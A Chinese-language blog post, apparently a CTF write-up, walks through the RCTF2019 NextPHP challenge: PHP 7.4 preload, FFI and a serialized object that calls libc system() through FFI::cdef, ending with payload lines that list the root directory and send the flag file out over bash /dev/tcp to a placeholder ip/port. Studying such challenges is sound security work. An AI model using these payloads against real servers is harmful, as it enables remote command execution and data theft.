@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>RCTF2019_NextPHP | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">RCTF2019_NextPHP</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 22, 2020&nbsp;&nbsp;17:08:57</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><ol>
+<li>php-7.4 新特性 preload</li>
+<li>在预加载文件中使用PHP FFI特性</li>
+<li>反序列化</li>
+</ol>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>打开题目，是很简单的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>越简单越搞事，所以先看一下<code>phpinfo</code>信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>可以看到的是php的版本很高：<code>7.4.0-dev</code>。</p>
+<p><img src="/2020/05/22/[RCTF2019]Nextphp/imgs/4.png" alt="4"></p>
+<p>另外一个是<code>disable_function</code>信息：</p>
+<p><img src="/2020/05/22/[RCTF2019]Nextphp/imgs/1.png" alt="1"></p>
+<p>在这里过滤掉了我们常用的命令执行的函数，但是没有过滤<code>scandir</code>，那就用这个函数来看一下其他文件信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;var_dump(scandir(&quot;.&quot;));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/22/[RCTF2019]Nextphp/imgs/2.png" alt="2"></p>
+<p>有一个<code>preload.php</code>文件，看一下里面是啥：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;highlight_file(&quot;preload.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>preload.php</code>，该文件就是<code>opcache.preload</code>指定的<code>preload</code>文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我本来还想再确定一些flag文件在哪里的，所以看了下根目录<code>/</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>结果发现因为设置了<code>open_basedir</code>路径，所以无法读取除了<code>/var/www/html</code>目录以外的文件。</p>
+<p><img src="/2020/05/22/[RCTF2019]Nextphp/imgs/3.png" alt="3"></p>
+<p>其实这些信息最好在刚才查看<code>phpinfo</code>信息的时候就收集好。所以重新收集一下本关需要的phpinfo信息（看其他的大佬写的wp）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php version: 7.4.0-dev</span><br><span class="line">FFI support: enabled</span><br><span class="line">opcache.preload: &#x2F;var&#x2F;www&#x2F;html&#x2F;preload.php</span><br><span class="line">open_basedir: &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">disable_classes: ReflectionClass</span><br><span class="line">disable_functions: set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a>是<strong>PHP 7.4中的重量级特性</strong>，也就是我们说的<strong>预加载</strong>。在这之前，需要先了解下<code>opcache</code>是什么东西。</p>
+<p>我们学习过一些高级语言，比如C/C++、Java、ASP、C#以及世界上最好的语言PHP（逃走），这些语言可以分为两种：<strong>解释型语言</strong>和<strong>编译型语言</strong>。</p>
+<p>编译型语言，也就是用对应的编译器，将高级语言<strong>一次</strong>翻译成对应平台硬件下可执行的机器码（机器指令和操作数），并且打包成可执行文件，这样就能在多个平台上运行，也就是一人挖井，众人吃水就行了，C/C++就是属于编译型语言。</p>
+<p>而解释型语言，就是在程序运行前将源程序<strong>预编译</strong>成中间语言（<strong>中间码</strong>），然后再由<strong>解释器</strong>执行中间语言。解释型语言的缺点就是，每次执行程序都需要重新编译，所以运行效率就降低了，而且不能脱离解释器单独执行，就像Java语言依赖于JVM（但其实Java不能简单的说就是解释型语言，因为所有的Java代码都是需要编译的），PHP依赖于Zend引擎。而且因为需要重新编译，所以相比于编译型语言，解释型语言通常会占用更多的内存和CPU资源。C#、PHP都是解释型语言。</p>
+<p>总结下两者的区别，也就是，编译型语言是在执行程序之前由编译器将代码一条一条编译成硬件能懂的机器语言，所以运行速度也会很快；而解释型语言是先进行预编译，生成中间码，然后在执行程序时，由解释器一条一条地将中间码解释为机器语言（按照执行顺序进行），因此速度慢，消耗计算机资源多。对于PHP来说，中间码就是<strong>opcode（也被称为操作码）</strong>，解释器就是Zend引擎，它会将opcode翻译成计算机能懂的机器指令，因此执行效率就下降了。</p>
+<p>比如我们有一段PHP代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line">$b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> $a + $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>php是这样去执行这段代码的：</p>
+<p><img src="/2020/05/22/[RCTF2019]Nextphp/imgs/php-workflow.png" alt="zend"></p>
+<p>主要分为四个部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Lexicon scan: 词法分析阶段，将PHP代码转换为语言片段（Tokens）</span><br><span class="line">Parse: 将Tokens转换为简单有意义的表达式</span><br><span class="line">Create Opcode: 预编译阶段，将上述表达式预编译成中间码Opcode</span><br><span class="line">Process Opcode: 一条一条地按照顺序执行opcode</span><br></pre></td></tr></table></figure>
+
+<p>上面扯了这么多，其实重点就是PHP作为一种解释型语言，在执行效率和资源占用上面有缺点。为了缓解这个缺点，开发者就想，因为有一些代码是会被重复执行的，在一定时间内可能都不会发生改变，那么如果对这些中间码进行缓存，那么就可以节省掉很多执行时间并减少资源占用。这就是<strong>opcache</strong>的由来了。</p>
+<p>下面这张图就是<strong>opcache</strong>的工作原理：</p>
+<p><img src="/2020/05/22/[RCTF2019]Nextphp/imgs/php-opcache.png" alt="php-opcache"></p>
+<p>可以看到，在执行完<strong>create opcode</strong>之后，会将其放入cache（共享内存）中。用户再次请求时，如果该php代码片段在cache中，如果用户再次请求该代码片段命中，直接取出该opcode，进行进行执行，从节省了词法分析，预编译生成opcode的时间，提升了性能。</p>
+<p>更具体的信息可以参考鸟哥的文章：</p>
+<blockquote>
+<p><a href="https://www.laruence.com/2008/06/18/221.html" target="_blank" rel="noopener">深入理解PHP原理之Opcodes</a>。</p>
+</blockquote>
+<p>因为opcache带来的新优势，在现实的生产环境中，基本都会选择开启opcode，但是opcache也并非十全十美。虽然消除了编译开销，但是opcache无法解决<strong>跨文件依赖问题</strong>。举个例子来说明，Class A是继承自Class B的，但是这两个类被存储在不同的php文件中，那么在执行时仍然需要将它们链接在一起，因为每个php文件的编译和缓存都是独立于其他文件的。并且我们仍然需要检查php源文件是不是被修改了，如果是，那么原先的opcache就失效了。为了解决这个问题，php开发者们就又提出了新的机制——<a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener"><strong>preload（预加载）</strong></a>。</p>
+<p>preload的灵感来自于为Java HotSpot VM设计的<strong>Class Data Sharing（类数据共享）</strong>技术。preload不仅仅可以将源文件编译成为opcode，还可以将相关的class，interface链接在一起，然后将这个编译后的可执行代码保存在内存中（opcache是保存opcode）。当用户向服务器发起请求时，就从内存中取出这部分可执行代码进行执行。</p>
+<p>更具体的信息可以参考文章：</p>
+<blockquote>
+<ol>
+<li><a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener">RFC preload</a></li>
+<li><a href="https://stitcher.io/blog/preloading-in-php-74" target="_blank" rel="noopener">Preloading in PHP7.4</a></li>
+<li><a href="https://github.com/php/php-src/pull/3538" target="_blank" rel="noopener">github issue #3538: An attempt to implemnt “preloading” ability</a></li>
+</ol>
+</blockquote>
+<p>在preload的rfc手册可以看到 <a href="https://wiki.php.net/rfc/preload#future_scope" target="_blank" rel="noopener">https://wiki.php.net/rfc/preload#future_scope</a> ：</p>
+<p><img src="/2020/05/22/[RCTF2019]Nextphp/imgs/5.png" alt="5"></p>
+<p>当与<code>ext/FFI</code>一起使用时，只允许在preload的PHP文件中使用<code>FFI</code>功能，而不允许在常规的PHP文件中使用。因为FFI能够直接调用相对底层的C语言库函数，所以具有一定的危险性。</p>
+<p><strong>FFI</strong>全称为<strong>Foreign Function interface</strong>，在 <a href="https://wiki.php.net/rfc/ffi" target="_blank" rel="noopener">https://wiki.php.net/rfc/ffi</a>  中对FFI的描述为：</p>
+<blockquote>
+<p>For PHP, FFI opens a way to write PHP extensions and bindings to C libraries in pure PHP. </p>
+</blockquote>
+<p>也就是说，对于PHP，FFI提供了一种用PHP编写PHP扩展并绑定到C函数库的方法。</p>
+<p>查看手册，我们可以看到<code>FFI::cdef</code>函数最多接受两个参数，第二个参数<code>$lib</code>是可选的：</p>
+<p><img src="/2020/05/22/[RCTF2019]Nextphp/imgs/7.png" alt="7"></p>
+<p>在官网上有一些调用c lib函数的例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// create FFI object, loading libc and exporting function printf()</span></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int printf(const char *format, ...);"</span>, <span class="comment">// this is regular C declaration</span></span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"><span class="comment">// call C printf()</span></span><br><span class="line">$ffi-&gt;printf(<span class="string">"Hello %s!\n"</span>, <span class="string">"world"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里在命令行测试一下，确实是执行成功了：</p>
+<p><img src="/2020/05/22/[RCTF2019]Nextphp/imgs/8.png" alt="8"></p>
+<p>这里没有.so文件也是可以成功执行，可以看到官方手册给出的解释是因为：</p>
+<blockquote>
+<p>If <code>lib</code> is omitted, platforms supporting <em>RTLD_DEFAULT</em> attempt to lookup symbols declared in <code>code</code> in the normal global scope. Other systems will fail to resolve these symbols.</p>
+</blockquote>
+<p>引用下<a href="https://mochazz.github.io/" target="_blank" rel="noopener">mochazz</a>师傅的说法就是：</p>
+<blockquote>
+<p>当<code>$lib</code>参数为空时，默认为<code>RTLD_DEFAULT</code>， 程序会按照默认共享库的顺序，从中搜索 <strong>system</strong> 函数第一次出现的地方并使用。搜索范围还包括了可执行程序极其依赖中的函数表（如果设置了 <strong>RTLD_GLOBAL</strong> 还会搜索动态加载库中的函数表），所以应该是这些搜索范围中存在可调用的 <strong>system</strong> 函数。 </p>
+</blockquote>
+<p>既然利用FFI可以调用C函数，那么我们就可以将<code>$data[&#39;func&#39;]</code>设置为<code>FFI::cdef</code>，<code>$data[&#39;arg&#39;]</code>设置为<code>int system(char *command);</code>来执行系统命令。</p>
+<p><img src="/2020/05/22/[RCTF2019]Nextphp/imgs/6.png" alt="6"></p>
+<p><code>class A implements Serializable</code>表明类A实现了自定义的对象反序列化方法。</p>
+<p>在<code>preload.php</code>中还引入了两个新的魔术方法：<code>__serialize</code>和<code>__unserialize</code>。这也是在<code>php 7.4</code>中新引入的特性，具体可以参考：<a href="https://wiki.php.net/rfc/custom_object_serialization。但在本题中这个特性没啥用处，等到有时间了可以好好研究一下。" target="_blank" rel="noopener">https://wiki.php.net/rfc/custom_object_serialization。但在本题中这个特性没啥用处，等到有时间了可以好好研究一下。</a></p>
+<p>payload（接口<code>Serializable</code>必须实现方法<code>serialize()</code>和<code>unserialize()</code>）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(char *command);'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj_A = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj_A);</span><br><span class="line"><span class="comment">// C:1:"A":89:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:26:"int system(char *command);";&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后的payload就是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 列出根目录下的文件</span><br><span class="line">?a&#x3D;unserialize(&#39;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#39;)-&gt;__get(&#39;ret&#39;)-&gt;system(&#39;bash -c &quot;ls &#x2F;&quot;&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 读取flag</span><br><span class="line">?a&#x3D;unserialize(&#39;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#39;)-&gt;__get(&#39;ret&#39;)-&gt;system(&#39;bash -c &quot;cat &#x2F;flag &gt; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port&quot;&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>这道题最奇葩的是我卡在了反弹shell这里，所以到最后我也没拿到最后的flag。。。唉，还是太菜了。。。</p>
+<p>虽然最后卡在了这里，但是总体来讲收获还是颇丰的。</p>
+<h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><p>除了上面没有实现的反弹shell之外，在学习PHP 7.4的FFI新特性时，想要自己搭建一个环境来复现一下这个环境，然后就要修改<code>php.ini</code>文件，下面这是测试之后发现必须要配置的几个选项：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[opcache]</span><br><span class="line">opcache.enable=<span class="number">1</span></span><br><span class="line">opcache.error_log=/tmp/opcache.log</span><br><span class="line">opcache.preload=/<span class="keyword">var</span>/www/html/preload.php</span><br><span class="line">opcache.preload_user=www-data</span><br><span class="line"></span><br><span class="line">[ffi]</span><br><span class="line">; FFI API restriction. Possible values:</span><br><span class="line">; <span class="string">"preload"</span> - enabled in CLI scripts <span class="keyword">and</span> preloaded files (<span class="keyword">default</span>)</span><br><span class="line">; <span class="string">"false"</span>   - always disabled</span><br><span class="line">; <span class="string">"true"</span>    - always enabled</span><br><span class="line">ffi.enable=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>一般来说，<code>opcache.preload</code>不允许是<code>root</code>用户。还有一个点就是<code>ffi.enable</code>要设置为<code>1</code>，如果是<code>false</code>，肯定不支持preload功能，但是设置为<code>preload</code>也是不够的，当<code>ffi.enable=preload</code>时，仅仅支持在命令行运行，在web端是无法成功利用<code>ffi</code>功能的。</p>
+<p>好像今年12月<strong>PHP 8</strong>就要发布了，而不再发布<strong>PHP 7.5</strong>，蹲一波新的特性。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/05/22/[RCTF2019]Nextphp/">https://bantttian.github.io/2020/05/22/[RCTF2019]Nextphp/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/Web/"># Web</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/05/26/SWPUCTF2018-SimplePHP/">SWPUCTF2018_SimplePHP之phar反序列化学习</a>
+            
+            
+            <a class="next" rel="next" href="/2020/05/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E6%9C%B1%E9%9B%80%E7%BB%84-webphp%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/">网鼎杯2020_朱雀组-webphp & 青龙组-AreUSerialz</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
